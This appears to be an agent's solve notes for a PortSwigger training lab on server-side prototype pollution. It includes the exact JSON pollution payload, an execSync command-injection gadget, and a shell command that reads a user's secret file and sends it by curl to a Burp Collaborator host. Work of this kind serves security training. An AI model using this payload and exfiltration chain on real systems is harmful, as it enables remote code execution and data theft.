---
metadata:
  node_type: memory
name: "Lab Solve: Exfiltrating sensitive data via server-side prototype pollution"
description: "A-arm solve record: SSP via lodash mergeWith (change-address) + inherited task lookup gadget in /admin/jobs (execSync), secret exfiltrated to Burp Collaborator, submitSolution correct:true."
last_updated: 2026-10-10T00:43:43+08:00
created: 2026-10-10T00:43:43+08:00
---

Lab: portswigger /web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution
Instance: 0a1b008203d49da2806c8aaa001300b6.web-security-academy.net, build date 2025-10
Result: solved (banner "Congratulations, you solved the lab!", submitSolution -> {"correct":true})

Recon
- Login is JSON (form button calls jsonSubmit): POST /login {"csrf","username","password"} with wiener:peter (pete is wrong).
- /my-account/change-address accepts application/json and echoes the merged user object -> pollution source.
- /admin accessible for wiener; POST /admin/jobs {csrf,sessionId,tasks:[...]} runs "maintenance jobs" (db-cleanup, fs-cleanup).
- A 500 from /admin/jobs (node app down: "Connection refused") dumped the whole webpack bundle in error.log - that is how the sink was read.

Source/gadget (from leaked bundle)
- merge helper = lodash mergeWith(target, body, customizer), banned keys [username,firstname,lastname,isAdmin], delete [sessionId]; recursion on "__proto__" reaches Object.prototype (proved by json spaces=10 changing Express res.json indentation).
- jobs module: const task = TASKS[name]; if (task) execSync(task.command). TASKS is a plain object, so a polluted Object.prototype[<name>] = {command:...} is returned for an unknown task name -> RCE. No spawn options gadget (execArgv/cwd/maxBuffer probes all negative).

Exploit (2 HTTP steps, then submit)
1. POST /my-account/change-address JSON: {"address_line_1":"a",...,"sessionId":"<cookie>","__proto__":{"evil-job":{"description":"Evil","name":"evil-job","command":"<cmd>"}}}
2. POST /admin/jobs JSON {"csrf":"<from /admin>","sessionId":"<cookie>","tasks":["evil-job"]} -> runs <cmd>

Exfil command used: `cat /home/carlos/secret >&2; cat /home/carlos/secret | curl -s -X POST --data-binary @- http://<collab>/secret; false`
- execSync throws on the trailing false, so the job result error.message reflects stderr: the file content comes back in the HTTP response itself.
- Directory listing leg: `ls -la /home/carlos >&2; ... | curl ... http://<collab>/dir; false` -> secret file = /home/carlos/secret (32 bytes).
- Secret: vi0NmTs8kqgNQz0LQc8KChlGswXdL79Y ; Burp Collaborator received POST /dir and POST /secret (base64-verified).

Notes
- The node app restarts wipe the in-memory session store and Object.prototype pollution -> re-login, re-pollute.
- cwd/maxBuffer/execArgv pollution is inert here; only the prototype-key lookup gadget fires.

